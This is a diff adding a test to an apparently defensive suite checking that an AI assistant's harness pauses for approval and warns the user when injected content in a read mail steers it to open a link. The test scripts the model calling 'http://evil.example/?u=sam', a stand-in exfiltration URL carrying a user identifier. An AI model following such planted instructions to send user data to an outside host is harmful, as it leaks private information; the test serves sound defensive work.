@@ -82,4 +82,21 @@ describe('a page that someone else steered', () => {
     expect(chat.callTool).toHaveBeenCalledTimes(1);
     expect(await stateOf(chat, later.id)).toContain('approval');
   });
+
+  it("says it in the assistant's own name, and calls the page read opening a web page", async () => {
+    const chat = await setupSearchChat({ assistant_name: 'Mannie' });
+    chat.callTool.mockImplementationOnce(() => Promise.resolve(toolResultResponse({ text: mail })));
+    chat.create
+      .mockImplementationOnce(() => searchStream({ id: 'call-1', query: 'account notices' }))
+      .mockImplementationOnce(() => searchStream({ id: 'call-2', args: { url: 'http://evil.example/?u=sam' } }))
+      .mockImplementation(() => textStream('Done.'));
+
+    const turn = await chat.run({ messages: say('Any account notices?') });
+
+    const state = await stateOf(chat, turn.id);
+    expect(state).toContain(
+      'Open a web page: http://evil.example/?u=sam. Mannie found this link in something it read, and opening it would send more than the link said.',
+    );
+    expect(state).not.toContain('Aman');
+  });
 });
